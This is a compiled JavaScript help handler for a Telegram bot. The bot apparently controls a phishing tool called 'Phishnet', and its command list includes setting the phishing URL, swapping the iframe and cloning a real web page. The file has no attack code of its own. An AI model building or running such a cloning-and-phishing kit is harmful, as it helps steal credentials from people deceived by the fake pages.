"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.help = void 0;
const bot_1 = __importDefault(require("../config/bot"));
const help = (msg) => {
    const chatId = msg.chat.id;
    const responseMsg = `
<b>/start</b> - Start interaction with the bot
<b>/set_url</b> - Set the Phishnet URL
\t-title=example - Update Title
\t-iframe=https://example.com - Update iframe URL
<b>/clone</b> - Clone the real web page
<b>/help</b> - Show this help message
<b>/version</b> - Get bot version info`;
    bot_1.default.sendMessage(chatId, responseMsg, { parse_mode: "HTML" });
};
exports.help = help;
